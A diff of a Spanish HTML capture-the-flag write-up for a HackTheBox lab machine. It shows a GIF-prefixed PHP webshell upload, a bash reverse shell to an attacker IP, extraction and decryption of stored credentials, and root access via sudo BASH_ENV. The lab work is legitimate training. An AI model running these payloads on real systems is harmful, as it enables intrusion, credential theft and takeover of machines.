+                        GitHub</a>, la vulnerabilidad permite subir archivos PHP que serán ejecutados si el nombre de
+                    archivo termina con un punto (<code>.php.</code>).</p>
+
                 <p>Mi primer intento de subir un archivo PHP es rechazado:</p>
-                <p><img src="./media/image1.png" alt="Mensaje de error mostrando rechazo de subida de archivo PHP" /></p>
-                
-                <p>Sin embargo, puedo eludir la validación del tipo de archivo anteponiendo magic bytes de GIF al archivo PHP:</p>
-                <p><img src="./media/image6.png" alt="Petición de subida modificada mostrando magic bytes de GIF antepuestos al código PHP" /></p>
-                
+                <p><img src="./media/image1.png" alt="Mensaje de error mostrando rechazo de subida de archivo PHP" />
+                </p>
+
+                <p>Sin embargo, puedo eludir la validación del tipo de archivo anteponiendo magic bytes de GIF al
+                    archivo PHP:</p>
+                <p><img src="./media/image6.png"
+                        alt="Petición de subida modificada mostrando magic bytes de GIF antepuestos al código PHP" />
+                </p>
+
                 <p>El payload que subo es una webshell PHP simple:</p>
                 <pre><code class="language-php">GIF89a
 &lt;?php system($_GET['cmd']); ?&gt;</code></pre>
-                
+
                 <p>Con el nombre de archivo: <code>xd.php.</code></p>
-                
+
                 <p>Logro exitosamente ejecución remota de código:</p>
-                <p><img src="./media/image5.png" alt="RCE exitoso mostrando salida de ejecución de comandos a través de la webshell subida" /></p>
-                
+                <p><img src="./media/image5.png"
+                        alt="RCE exitoso mostrando salida de ejecución de comandos a través de la webshell subida" />
+                </p>
+
                 <h3>Obteniendo una Reverse Shell</h3>
                 <p>Usando la webshell, ejecuto un payload de reverse shell en bash:</p>
                 <pre><code class="language-bash">bash -c "bash -i >& /dev/tcp/10.10.16.18/443 0>&1"</code></pre>
-                
+
                 <p>La petición completa codificada en URL:</p>
                 <pre><code class="language-plaintext">http://environment.htb/storage/files/xd.php?cmd=bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.10.16.18/443+0%3E%261%22</code></pre>
-                
+
                 <p>Recibo una conexión como usuario <code>www-data</code>.</p>
-                
+
                 <h2>Movimiento Lateral - Descubriendo Credenciales Cifradas</h2>
-                <p>Explorando el sistema de archivos, descubro el usuario <code>hish</code> en <code>/home</code>. Dentro del directorio home del usuario, encuentro:</p>
+                <p>Explorando el sistema de archivos, descubro el usuario <code>hish</code> en <code>/home</code>.
+                    Dentro del directorio home del usuario, encuentro:</p>
                 <ul>
                     <li><code>backup/keyvault.gpg</code> - Un archivo cifrado con GPG</li>
                     <li><code>.gnupg/</code> - Un directorio conteniendo archivos de llavero GPG</li>
                 </ul>
-                
-                <p>También examino el archivo <code>.env</code> de Laravel en la raíz del proyecto, pero no contiene credenciales útiles.</p>
-                
+
+                <p>También examino el archivo <code>.env</code> de Laravel en la raíz del proyecto, pero no contiene
+                    credenciales útiles.</p>
+
                 <p>Comprobando la base de datos SQLite, extraigo los siguientes hashes de usuario:</p>
                 <pre><code class="language-plaintext">hish@environment.htb:$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi
 jono@environment.htb:$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm
 bethany@environment.htb:$2y$12$6kbg21YDMaGrt.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.</code></pre>
-                
-                <p>Estos son hashes bcrypt que llevarían tiempo significativo crackear, así que me centro en el archivo cifrado con GPG en su lugar.</p>
-                
+
+                <p>Estos son hashes bcrypt que llevarían tiempo significativo crackear, así que me centro en el archivo
+                    cifrado con GPG en su lugar.</p>
+
                 <h3>Descifrando el Vault GPG</h3>
                 <p>Mi primer intento de descifrar el archivo falla debido a problemas de permisos:</p>
                 <pre><code class="language-bash">www-data@environment:~/app$ gpg --decrypt keyvault.gpg
 gpg: Fatal: can't create directory '/var/www/.gnupg': Permission denied</code></pre>
-                
+
                 <p>Intentar usar el directorio GPG del usuario directamente también falla:</p>
                 <pre><code class="language-bash">www-data@environment:/home/hish$ gpg --homedir .gnupg/ --decrypt backup/keyvault.gpg
 gpg: WARNING: unsafe ownership on homedir '/home/hish/.gnupg'
@@ -387,24 +495,26 @@ gpg: can't connect to the agent: Permission denied
 gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
 "hish_ <hish@environment.htb>"
 gpg: decryption failed: No secret key</code></pre>
-                
-                <p>La solución es copiar todo el directorio <code>.gnupg</code> a <code>/tmp</code> donde tengo permisos completos:</p>
+
+                <p>La solución es copiar todo el directorio <code>.gnupg</code> a <code>/tmp</code> donde tengo permisos
+                    completos:</p>
                 <pre><code class="language-bash">www-data@environment:/home/hish$ cp -r .gnupg/ /tmp/mygpg
 www-data@environment:/home/hish$ cd /tmp
 www-data@environment:/tmp$ chmod -R 700 mygpg/
 www-data@environment:/tmp$ gpg --homedir /tmp/mygpg --decrypt /home/hish/backup/keyvault.gpg</code></pre>
-                
+
                 <p>Esto descifra exitosamente el archivo, revelando un vault de contraseñas:</p>
                 <pre><code class="language-plaintext">gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
 "hish_ <hish@environment.htb>"
 PAYPAL.COM -> Ihaves0meMon$yhere123
 ENVIRONMENT.HTB -> marineSPm@ster!!
 FACEBOOK.COM -> summerSunnyB3ACH!!</code></pre>
-                
-                <p>Usando las credenciales para <code>ENVIRONMENT.HTB</code>, cambio exitosamente al usuario <code>hish</code>:</p>
+
+                <p>Usando las credenciales para <code>ENVIRONMENT.HTB</code>, cambio exitosamente al usuario
+                    <code>hish</code>:</p>
                 <pre><code class="language-bash">su hish
 Password: marineSPm@ster!!</code></pre>
-                
+
                 <h2>Escalada de Privilegios - Explotación de BASH_ENV</h2>
                 <p>Comprobando privilegios sudo para el usuario <code>hish</code>:</p>
                 <pre><code class="language-bash">hish@environment:~$ sudo -l
@@ -414,26 +524,34 @@ Matching Defaults entries for hish on environment:
 
 User hish may run the following commands on environment:
     (ALL) /usr/bin/systeminfo</code></pre>
-                
-                <p>El detalle clave aquí es la configuración <code>env_keep+="ENV BASH_ENV"</code>. Esto significa que las variables de entorno <code>ENV</code> y <code>BASH_ENV</code> se preservan al ejecutar comandos con sudo.</p>
-                
+
+                <p>El detalle clave aquí es la configuración <code>env_keep+="ENV BASH_ENV"</code>. Esto significa que
+                    las variables de entorno <code>ENV</code> y <code>BASH_ENV</code> se preservan al ejecutar comandos
+                    con sudo.</p>
+
                 <h3>Entendiendo BASH_ENV</h3>
-                <p>La variable de entorno <code>BASH_ENV</code> especifica un script que bash ejecutará antes de ejecutar cualquier comando en modo no interactivo. Cuando se combina con privilegios sudo que preservan esta variable, crea un vector de escalada de privilegios.</p>
-                
-                <p>Examinando el script <code>systeminfo</code> revela que es un simple script bash que ejecuta comandos como <code>echo</code>. Como estos comandos son ejecutados por bash, y <code>BASH_ENV</code> se preserva, puedo explotar esto para obtener acceso root.</p>
-                
+                <p>La variable de entorno <code>BASH_ENV</code> especifica un script que bash ejecutará antes de
+                    ejecutar cualquier comando en modo no interactivo. Cuando se combina con privilegios sudo que
+                    preservan esta variable, crea un vector de escalada de privilegios.</p>
+
+                <p>Examinando el script <code>systeminfo</code> revela que es un simple script bash que ejecuta comandos
+                    como <code>echo</code>. Como estos comandos son ejecutados por bash, y <code>BASH_ENV</code> se
+                    preserva, puedo explotar esto para obtener acceso root.</p>
+
                 <h3>Pasos de Explotación</h3>
                 <p>Primero, creo un script simple conteniendo <code>/bin/bash</code>:</p>
                 <pre><code class="language-bash">hish@environment:~$ echo '/bin/bash' > /tmp/xd.sh</code></pre>
-                
+
                 <p>Luego, exporto la variable <code>BASH_ENV</code> apuntando a este script:</p>
                 <pre><code class="language-bash">hish@environment:~$ export BASH_ENV=/tmp/xd.sh</code></pre>
-                
-                <p>Finalmente, ejecuto <code>systeminfo</code> con sudo. Antes de que bash ejecute los comandos en el script <code>systeminfo</code>, primero ejecuta el script especificado en <code>BASH_ENV</code>, que genera una shell root:</p>
+
+                <p>Finalmente, ejecuto <code>systeminfo</code> con sudo. Antes de que bash ejecute los comandos en el
+                    script <code>systeminfo</code>, primero ejecuta el script especificado en <code>BASH_ENV</code>, que
+                    genera una shell root:</p>
                 <pre><code class="language-bash">hish@environment:~$ sudo systeminfo
 root@environment:/home/hish# whoami
 root</code></pre>
-                
+
                 <p>Ahora tengo acceso root y puedo recuperar la flag de root, completando la máquina.</p>
             </div>
         </article>
